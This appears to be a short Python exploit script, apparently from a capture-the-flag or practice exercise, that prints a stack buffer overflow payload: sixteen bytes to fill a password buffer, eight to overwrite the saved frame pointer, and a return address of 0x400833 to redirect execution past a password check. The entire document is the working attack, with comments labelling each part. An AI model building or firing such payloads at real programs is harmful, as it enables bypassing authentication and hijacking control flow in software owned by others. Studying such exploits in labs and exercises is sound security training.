import sys
sys.stdout.buffer.write(
    b"A"*16            # overwrite password[16]
  + b"B"*8             # smash saved RBP
  + b"\x33\x08\x40\x00\x00\x00\x00\x00"  # ret ← 0x400833
)
